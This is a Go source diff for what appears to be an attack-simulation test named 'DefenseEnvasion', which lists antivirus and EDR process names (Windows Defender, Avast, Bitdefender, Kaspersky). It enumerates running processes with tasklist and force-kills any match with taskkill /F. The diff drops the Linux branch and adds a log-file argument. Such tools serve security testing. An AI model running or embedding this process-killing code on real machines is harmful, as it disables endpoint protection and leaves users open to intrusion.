@@ -1,11 +1,9 @@
 package main
 
 import (
-	"fmt"
 	"helpers"
 	"os"
 	"os/exec"
-	"runtime"
 	"strings"
 )
 
@@ -15,20 +13,11 @@ type AVEDRExe struct {
 }
 
 var WinAVEDRExecs = []AVEDRExe{AVEDRExe{"Windows Defender", "MsMpEng.exe"}, AVEDRExe{"Avast", "AvastUI.exe"}, AVEDRExe{"Avast", "AvastSvc.exe"}, AVEDRExe{"Bitdefender", "btredline.exe"}, AVEDRExe{"Bitdefender", "btservicehost.exe"}, AVEDRExe{"Bitdefender", "btagent.exe"}, AVEDRExe{"Bitdefender", "btntwrk.exe"}, AVEDRExe{"Kaspersky", "avp.exe"}, AVEDRExe{"Kaspersky", "avpui.exe"}}
-var LinAVEDRExecs = []AVEDRExe{AVEDRExe{"ClamAV", "clam"}}
 
 func checkIfItIsAVEDR(name string) bool {
-	if runtime.GOOS == "windows" {
-		for i := 0; i < len(WinAVEDRExecs); i++ {
-			if WinAVEDRExecs[i].exe == name {
-				return true
-			}
-		}
-	} else {
-		for i := 0; i < len(LinAVEDRExecs); i++ {
-			if LinAVEDRExecs[i].exe == name {
-				return true
-			}
+	for i := 0; i < len(WinAVEDRExecs); i++ {
+		if WinAVEDRExecs[i].exe == name {
+			return true
 		}
 	}
 
@@ -45,73 +34,52 @@ func main() {
 	for i := 0; i < len(listOfAVEDR); i++ {
 		fmt.Println(listOfAVEDR[i])
 	}*/
-
-	nameOfLogFile := helpers.CreateLogFileIfItDoesNotExist("./", "DefenseEnvasion")
-	helpers.WriteLog(nameOfLogFile, "Starting test: DefenseEnvasion", 2)
-
-	if runtime.GOOS == "windows" {
-		getProcesses := exec.Command("tasklist")
-		processes, err := getProcesses.Output()
-		if err != nil {
-			helpers.WriteLog(nameOfLogFile, err.Error(), 1)
-			os.Exit(2)
-		}
-
-		processInfo := strings.Split(string(processes), "\n")
-		var AVEDRprocess []string
-		for i := 3; i < len(processInfo); i++ {
-			processFileds := strings.Fields(processInfo[i])
-			if len(processFileds) > 0 {
-				name := processFileds[0]
-				if checkIfItIsAVEDR(name) {
-					AVEDRprocess = append(AVEDRprocess, name)
-				}
-			}
-
-		}
-
-		for i := 0; i < len(AVEDRprocess); i++ {
-			stopAVEDR := exec.Command("taskkill", "/IM", AVEDRprocess[i], "/F")
-			out, err := stopAVEDR.Output()
-			if err != nil {
-				if err.Error() == "exit status 1" {
-					helpers.WriteLog(nameOfLogFile, string(out), 1)
-					os.Exit(1)
-				} else {
-					helpers.WriteLog(nameOfLogFile, err.Error(), 1)
-					os.Exit(3)
-				}
-			} else {
-				os.Exit(0)
-			}
-		}
+	var nameOfLogFile string
+	if len(os.Args) == 2 {
+		nameOfLogFile = os.Args[1]
 	} else {
-		var AVEDRprocess []string
-		for i := 0; i < len(LinAVEDRExecs); i++ {
-			getpids := exec.Command("/bin/pgrep", LinAVEDRExecs[i].name)
-			pids, _ := getpids.CombinedOutput()
-			pidsstr := strings.Fields(string(pids))
-			for j := 0; j < len(pidsstr); j++ {
-				AVEDRprocess = append(AVEDRprocess, pidsstr[i])
-				fmt.Println(pidsstr[i])
+		nameOfLogFile = helpers.CreateLogFileIfItDoesNotExist("./", "DefenseEnvasion", "DefenseEnvasion")
+	}
+
+	helpers.WriteLog(nameOfLogFile, "Starting test: DefenseEnvasion", 2, "DefenseEnvasion")
+
+	getProcesses := exec.Command("tasklist")
+	processes, err := getProcesses.Output()
+	if err != nil {
+		helpers.WriteLog(nameOfLogFile, err.Error(), 1, "DefenseEnvasion")
+		os.Exit(2)
+	}
+
+	processInfo := strings.Split(string(processes), "\n")
+	var AVEDRprocess []string
+	for i := 3; i < len(processInfo); i++ {
+		processFileds := strings.Fields(processInfo[i])
+		if len(processFileds) > 0 {
+			name := processFileds[0]
+			if checkIfItIsAVEDR(name) {
+				AVEDRprocess = append(AVEDRprocess, name)
 			}
 		}
 
-		for i := 0; i < len(AVEDRprocess); i++ {
-			stopAVEDR := exec.Command("kill", "-9", AVEDRprocess[i])
-			err := stopAVEDR.Run()
-			if err != nil {
-				if err.Error() == "exit status 1" {
-					os.Exit(1)
-				} else {
-					helpers.WriteLog(nameOfLogFile, err.Error(), 1)
-					os.Exit(3)
-				}
+	}
+
+	for i := 0; i < len(AVEDRprocess); i++ {
+		stopAVEDR := exec.Command("taskkill", "/IM", AVEDRprocess[i], "/F")
+		out, err := stopAVEDR.Output()
+		if err != nil {
+			if err.Error() == "exit status 1" {
+				helpers.WriteLog(nameOfLogFile, string(out), 1, "DefenseEnvasion")
+				os.Exit(1)
+			} else {
+				helpers.WriteLog(nameOfLogFile, err.Error(), 1, "DefenseEnvasion")
+				os.Exit(3)
 			}
+		} else {
+			os.Exit(0)
 		}
 	}
 
-	helpers.WriteLog(nameOfLogFile, "Ending test: DefenseEnvasion", 2)
+	helpers.WriteLog(nameOfLogFile, "Ending test: DefenseEnvasion", 2, "DefenseEnvasion")
 	os.Exit(0)
 
 }
